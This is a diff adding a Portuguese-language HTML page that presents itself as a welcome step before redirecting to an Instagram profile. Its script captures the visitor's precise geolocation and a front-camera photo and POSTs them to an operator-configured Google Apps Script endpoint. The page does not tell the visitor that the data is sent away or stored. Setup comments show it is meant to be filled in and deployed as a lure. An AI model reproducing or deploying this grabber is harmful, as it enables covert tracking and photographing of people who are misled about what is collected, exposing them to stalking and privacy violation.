@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captura de Dados e Redirecionamento</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f2f5;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 100%;
+            margin: auto;
+        }
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+        }
+        p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+        button {
+            background-color: #4CAF50; /* Verde */
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 17px;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            min-height: 20px; /* Garante espaço mesmo vazio */
+        }
+        #video {
+            display: none; /* Inicia oculto */
+            width: 100%;
+            max-width: 320px;
+            height: auto;
+            margin: 20px auto;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background-color: #000; /* Fundo preto para quando não houver vídeo */
+            transform: scaleX(-1); /* Espelha a imagem da câmera frontal */
+        }
+        #canvas {
+            display: none; /* Canvas oculto, usado para pegar a imagem do vídeo */
+        }
+        .loading-spinner {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bem-vindo!</h1>
+        <p>Para continuar, precisamos da sua permissão para acessar sua localização e câmera.</p>
+        <p>Após a aceitação e captura, você será redirecionado para a página do Instagram.</p>
+        <button id="btnIniciar">
+            <span id="buttonText">Aceitar e Continuar</span>
+            <div class="loading-spinner" id="spinner"></div>
+        </button>
+        <p id="status"></p>
+
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        const btnIniciar = document.getElementById('btnIniciar');
+        const buttonText = document.getElementById('buttonText');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const statusDiv = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+
+        // IMPORTANTE: SUBSTITUA ESTE URL!
+        // Este será o URL do seu Google Apps Script (Passo 2.5)
+        const APPS_SCRIPT_WEB_APP_URL = 'SEU_URL_DO_APPS_SCRIPT_AQUI';
+
+        let streamGlobal = null; // Para armazenar o stream da câmera
+
+        // Função para mostrar status e spinner
+        function showStatus(message, isLoading = false, type = 'info') {
+            statusDiv.textContent = message;
+            statusDiv.style.color = type === 'error' ? '#d32f2f' : (type === 'success' ? '#388e3c' : '#555');
+            spinner.style.display = isLoading ? 'block' : 'none';
+            buttonText.style.display = isLoading ? 'none' : 'inline';
+            btnIniciar.disabled = isLoading;
+        }
+
+        btnIniciar.addEventListener('click', async () => {
+            showStatus('Solicitando permissões...', true);
+
+            let latitude = null;
+            let longitude = null;
+            let imageDataURL = null;
+
+            // Valida se o URL do Apps Script foi configurado
+            if (APPS_SCRIPT_WEB_APP_URL === 'https://script.google.com/macros/s/AKfycbxQ1DlLmmN_vZCthrO9_cTCFQ0zyL6hWtMMkUbX-WQbol2ZtSXHhBfuJswxmcNBiF18/exec' || !APPS_SCRIPT_WEB_APP_URL.startsWith('https://script.google.com/macros/')) {
+                showStatus('Erro: O URL do Google Apps Script não foi configurado corretamente no código.', false, 'error');
+                console.error('Por favor, substitua "SEU_URL_DO_APPS_SCRIPT_AQUI" pelo URL real do seu aplicativo web do Apps Script.');
+                return;
+            }
+
+            try {
+                // 1. Solicitar Localização
+                if (navigator.geolocation) {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+                    });
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
+                    console.log('Localização capturada:', latitude, longitude);
+                    showStatus('Localização obtida. Solicitando câmera...', true);
+                } else {
+                    throw new Error('Geolocalização não é suportada pelo seu navegador.');
+                }
+
+                // 2. Solicitar Câmera
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    streamGlobal = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); // 'user' para câmera frontal
+                    video.srcObject = streamGlobal;
+                    video.style.display = 'block';
+
+                    // Espera o vídeo ser carregado e reproduzido
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
+
+                    // Pequeno atraso para garantir que a imagem seja estável
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    // Captura a imagem
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    imageDataURL = canvas.toDataURL('image/png');
+                    console.log('Imagem capturada.');
+
+                } else {
+                    throw new Error('Acesso à câmera não é suportado ou permissão negada.');
+                }
+
+                showStatus('Captura de imagem e localização realizada. Enviando dados...', true);
+
+                // 3. Enviar dados para o Google Apps Script
+                const response = await fetch(APPS_SCRIPT_WEB_APP_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        latitude: latitude,
+                        longitude: longitude,
+                        imageBase64: imageDataURL.split(',')[1] // Envia apenas a parte base64 da imagem
+                    })
+                });
+
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(`Erro ao enviar dados para o servidor: ${response.status} - ${errorData.message}`);
+                }
+
+                const result = await response.json();
+                console.log('Resposta do servidor:', result);
+
+                // 4. Redirecionar se o backend indicar sucesso
+                if (result.success) {
+                    showStatus('Sucesso! Redirecionando para o Instagram...', false, 'success');
+                    setTimeout(() => {
+                        window.location.href = 'https://www.instagram.com/s1tes_ninna';
+                    }, 2000);
+                } else {
+                    showStatus(`Erro do servidor: ${result.message}. O redirecionamento não será realizado.`, false, 'error');
+                }
+
+            } catch (error) {
+                console.error('Erro no processo:', error);
+                showStatus(`Erro: ${error.message}. O redirecionamento não será realizado.`, false, 'error');
+            } finally {
+                // Parar o stream da câmera para liberar o recurso
+                if (streamGlobal) {
+                    streamGlobal.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                    video.style.display = 'none';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
